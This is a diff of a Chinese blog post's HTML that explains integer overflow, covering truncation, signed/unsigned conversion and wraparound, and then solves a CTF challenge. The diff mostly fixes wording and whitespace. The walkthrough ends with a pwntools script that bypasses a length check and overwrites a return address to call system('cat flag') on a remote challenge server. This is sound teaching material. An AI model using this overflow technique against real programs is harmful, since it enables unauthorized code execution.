@@ -107,11 +107,12 @@
 <meta property="og:image" content="http://1234xxh.github.io/image/N2LL/10.jpg">
 <meta property="og:image" content="http://1234xxh.github.io/image/20200325/1.png">
 <meta property="og:image" content="http://1234xxh.github.io/image/20200325/2.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200325/2-1.png">
 <meta property="og:image" content="http://1234xxh.github.io/image/20200325/3.png">
 <meta property="og:image" content="http://1234xxh.github.io/image/20200325/4.png">
 <meta property="og:image" content="http://1234xxh.github.io/image/20200325/5.png">
 <meta property="og:image" content="http://1234xxh.github.io/image/20200325/6.png">
-<meta property="og:updated_time" content="2020-03-26T01:40:12.590Z">
+<meta property="og:updated_time" content="2020-04-07T06:16:05.924Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="不一样的整数溢出">
 <meta name="twitter:description" content="一个经常被忽视的溢出">
@@ -400,7 +401,7 @@
         <p>一个经常被忽视的溢出</p>
 <p><img src="/image/N2LL/10.jpg" alt="image"><br><a id="more"></a></p>
 <h1 id="0x01为什么会存在整数溢出"><a href="#0x01为什么会存在整数溢出" class="headerlink" title="0x01为什么会存在整数溢出"></a>0x01为什么会存在整数溢出</h1><blockquote>
-<p>回答这个问题前，我们需要了解下整数在计算机的存储方式。在计算机中，因为二值逻辑，只有开和关（通电、断电）来表示两种状态，这刚好与”0”、”1”相对应，因此在存储单元都是以0和1来呈现，那么对于有符号数与无符号数的区别就是：以所能表示的长度的空间，它的最高位所代表的性质不同，如下如所示：</p>
+<p>回答这个问题前，我们需要了解下整数在计算机的存储方式。在计算机中，因为二值逻辑，只有开和关（通电、断电）来表示两种状态，这刚好与”0”、”1”相对应，因此在存储单元都是以0和1来呈现，那么对于有符号数与无符号数的区别就是：以所能表示的长度的空间，它的最高位所代表的性质不同，如下图所示：</p>
 </blockquote>
 <p><img src="/image/20200325/1.png" alt="image"></p>
 <blockquote>
@@ -412,7 +413,7 @@
 <h1 id="0x03-整数溢出例子分解"><a href="#0x03-整数溢出例子分解" class="headerlink" title="0x03 整数溢出例子分解"></a>0x03 整数溢出例子分解</h1><blockquote>
 <p>知道了原理，也清楚了类型，这里就一个一个分解，个人感觉论溢出的时候，从二进制出发考虑数据类型的取值范围和溢出临界点会更容易理解。</p>
 </blockquote>
-<h2 id="一、截断"><a href="#一、截断" class="headerlink" title="一、截断"></a>一、截断</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    int a = 65536;                   // 0x10000 -&gt; 1 0000 0000 0000 0000</span><br><span class="line">    short b;                     </span><br><span class="line">    b = a;</span><br><span class="line">    printf(&quot;%d\n&quot;, b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="一、截断"><a href="#一、截断" class="headerlink" title="一、截断"></a>一、截断</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    int a = 65536;                   // 0x10000 -&gt; 1 0000 0000 0000 0000</span><br><span class="line">    short b;</span><br><span class="line">    b = a;</span><br><span class="line">    printf(&quot;%d\n&quot;, b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>short 为16bit（其中1位符号位），int为32bit（其中1位符号位）当把a（17bit）赋值给b时，会发生高位截断，从而b为 0000 0000 0000 0000，也就是0。再来详细看一下具体执行过程。</p>
 </blockquote>
@@ -420,7 +421,7 @@
 <blockquote>
 <p>可以发现，在执行的时候eax的高位被截断了，只有操作了低16位的存储的数值。</p>
 </blockquote>
-<h2 id="二、有-无-符号数之间的转换"><a href="#二、有-无-符号数之间的转换" class="headerlink" title="二、有(无)符号数之间的转换"></a>二、有(无)符号数之间的转换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    unsigned short a = 32768;                   // 0x8000 -&gt; 1000 0000 0000 0000</span><br><span class="line">    short int b;                     </span><br><span class="line">    b = a;</span><br><span class="line">    printf(&quot;%d\n&quot;, b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="二、有-无-符号数之间的转换"><a href="#二、有-无-符号数之间的转换" class="headerlink" title="二、有(无)符号数之间的转换"></a>二、有(无)符号数之间的转换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    unsigned short a = 32768;                   // 0x8000 -&gt; 1000 0000 0000 0000</span><br><span class="line">    short int b;</span><br><span class="line">    b = a;</span><br><span class="line">    printf(&quot;%d\n&quot;, b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>此时b又是多少呢？按照刚才的方法，从二进制的数入手，显然b为：1000 0000 0000 0000，虽然每一位的数没有变，但是最高位的性质变了，现在为符号位，也就是表示负数，后面15位为数值。那么此时的值是多少呢？计算机对负数是以补码的形式进行保存的，因此值为-2的15次方*1，也就是-32768。再来详细看一下具体执行过程。</p>
 </blockquote>
@@ -428,7 +429,7 @@
 <h2 id="三、有-无-符号的四则运算"><a href="#三、有-无-符号的四则运算" class="headerlink" title="三、有(无)符号的四则运算"></a>三、有(无)符号的四则运算</h2><blockquote>
 <p>先来看有符号的加法</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    short a = 32767;                   // 0x7fff -&gt; 0111 1111 1111 1111            </span><br><span class="line">    a++;</span><br><span class="line">    printf(&quot;%d\n&quot;, a);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    short a = 32767;                   // 0x7fff -&gt; 0111 1111 1111 1111</span><br><span class="line">    a++;</span><br><span class="line">    printf(&quot;%d\n&quot;, a);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>short最大数加一后，就会变成最小数。</p>
 </blockquote>
@@ -437,6 +438,10 @@
 <p>再来详细看一下具体执行过程。</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0040152E    66:C74424 1E FF&gt;mov word ptr ss:[esp+0x1E],0x7FFF</span><br><span class="line">// Stack ss:[0061FE9E]=7FFF</span><br><span class="line">00401535    0FB74424 1E     movzx eax,word ptr ss:[esp+0x1E]</span><br><span class="line">// eax=0007FFF</span><br><span class="line">0040153A    83C0 01         add eax,0x1</span><br><span class="line">// 执行自加，eax=008000</span><br><span class="line">0040153D    66:894424 1E    mov word ptr ss:[esp+0x1E],ax</span><br><span class="line">// Stack ss:[0061FE9E]=8000</span><br><span class="line">00401542    0FBF4424 1E     movsx eax,word ptr ss:[esp+0x1E]</span><br><span class="line">// 使用movsx把0x8000再次放进eax中，eax=FFF8000</span><br><span class="line">00401547    894424 04       mov dword ptr ss:[esp+0x4],eax</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>再来看一下无符号数，其实原理是一样的，如果说有符号数是一个坐标轴（如上图所示），那么无符号数就是一个圆盘（如下图所示），无论上溢出还是下溢出，都是围绕圆心循环转。</p>
+</blockquote>
+<p><img src="/image/20200325/2-1.png" alt="image"></p>
 <blockquote>
 <p>分析完这几个类型后，疑惑就来了，说了这么多怎么利用呢？</p>
 </blockquote>
@@ -461,9 +466,9 @@
 </blockquote>
 <p><img src="/image/20200325/3.png" alt="image"></p>
 <blockquote>
-<p>v3的数值就是s的长度的低8位的数值，所以我们只要控制低8位的值就可以绕过if，完成后面的栈溢出攻击。<br>继续分析，v3∈(3, 8]，化为二进制(0000 0011, 0000 1000]，那么s的长度(设为L)的后八位应该为(0000 0011, 0000 1000]，要想达到整数溢出，L的第九位数值必须为1，即L(低九位)∈(10000 0011, 10000 1000]，也就是(259, 264],这也是整个L的长度。构造payload来获取flag，在IDA中可以找到</p>
+<p>v3的数值就是s的长度的低8位的数值，所以我们只要控制低8位的值就可以绕过if，完成后面的栈溢出攻击。<br>继续分析，v3∈(3, 8]，化为二进制(0000 0011, 0000 1000]，那么s的长度(设为L)的低八位应该也为(0000 0011, 0000 1000]，要想既达到整数溢出的目的，又能进行栈溢出攻击，L至少有一位（大于第八位）上的数值为1，这里选取只有第九位的数值为1，即L(低九位)∈(10000 0011, 10000 1000]，也就是(259, 264],这也是整个L的长度。构造payload来获取flag，在IDA中可以找到</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int what_is_this()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat flag&quot;);</span><br><span class="line">&#125;</span><br><span class="line">对应</span><br><span class="line">.text:0804868B what_is_this    proc near</span><br><span class="line">.text:0804868B ; __unwind &#123;</span><br><span class="line">.text:0804868B                 push    ebp</span><br><span class="line">.text:0804868C                 mov     ebp, esp</span><br><span class="line">.text:0804868E                 sub     esp, 8</span><br><span class="line">.text:08048691                 sub     esp, 0Ch</span><br><span class="line">.text:08048694                 push    offset command  ; &quot;cat flag&quot;</span><br><span class="line">.text:08048699                 call    _system</span><br><span class="line">.text:0804869E                 add     esp, 10h</span><br><span class="line">.text:080486A1                 nop</span><br><span class="line">.text:080486A2                 leave</span><br><span class="line">.text:080486A3                 retn</span><br><span class="line">.text:080486A3 ; &#125; // starts at 804868B</span><br><span class="line">.text:080486A3 what_is_this    endp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int what_is_this()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat flag&quot;);</span><br><span class="line">&#125;</span><br><span class="line">对应汇编代码：</span><br><span class="line">.text:0804868B what_is_this    proc near</span><br><span class="line">.text:0804868B ; __unwind &#123;</span><br><span class="line">.text:0804868B                 push    ebp</span><br><span class="line">.text:0804868C                 mov     ebp, esp</span><br><span class="line">.text:0804868E                 sub     esp, 8</span><br><span class="line">.text:08048691                 sub     esp, 0Ch</span><br><span class="line">.text:08048694                 push    offset command  ; &quot;cat flag&quot;</span><br><span class="line">.text:08048699                 call    _system</span><br><span class="line">.text:0804869E                 add     esp, 10h</span><br><span class="line">.text:080486A1                 nop</span><br><span class="line">.text:080486A2                 leave</span><br><span class="line">.text:080486A3                 retn</span><br><span class="line">.text:080486A3 ; &#125; // starts at 804868B</span><br><span class="line">.text:080486A3 what_is_this    endp</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>把返回地址覆盖为0x804868B即可获取flag，构造payload</p>
 </blockquote>
@@ -479,10 +484,10 @@
 <blockquote>
 <p>分析到这，此题也算是做完了，编写exp拿到flag即可，而且此题对整数溢出的应用更加深了。</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">io = remote(&quot;111.198.29.45&quot;, 35521) </span><br><span class="line">cat_flag_addr = 0x0804868B </span><br><span class="line">io.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;) </span><br><span class="line">io.sendlineafter(&quot;your username:&quot;, &quot;threepwn&quot;) </span><br><span class="line">payload = flat([&apos;a&apos; * 0x18, cat_flag_addr, &apos;a&apos; * 232])</span><br><span class="line">io.sendlineafter(&quot;your passwd:&quot;, payload) </span><br><span class="line">io.recv() </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = remote(&quot;111.198.29.45&quot;, 35521)</span><br><span class="line">cat_flag_addr = 0x0804868B</span><br><span class="line">io.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)</span><br><span class="line">io.sendlineafter(&quot;your username:&quot;, &quot;threepwn&quot;)</span><br><span class="line">payload = flat([&apos;a&apos; * 0x18, cat_flag_addr, &apos;a&apos; * 232])</span><br><span class="line">io.sendlineafter(&quot;your passwd:&quot;, payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <p>0x04 附录</p>
 <blockquote>
-<p>借用ctfwiki的一幅图（个人感觉从二进制入手会更容易理解整数溢出）</p>
+<p>借用ctfwiki的一幅图（个人感觉从二进制的数值入手会更容易理解整数溢出）</p>
 </blockquote>
 <p><img src="/image/20200325/6.png" alt="image"></p>
 <p>0x05 尾记</p>
@@ -589,6 +594,10 @@
 
           <div class="post-nav-prev post-nav-item">
             
+              <a href="/2020/04/07/1/" rel="prev" title="再探ROP(上)">
+                再探ROP(上) <i class="fa fa-chevron-right"></i>
+              </a>
+            
           </div>
         </div>
       
@@ -673,7 +682,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
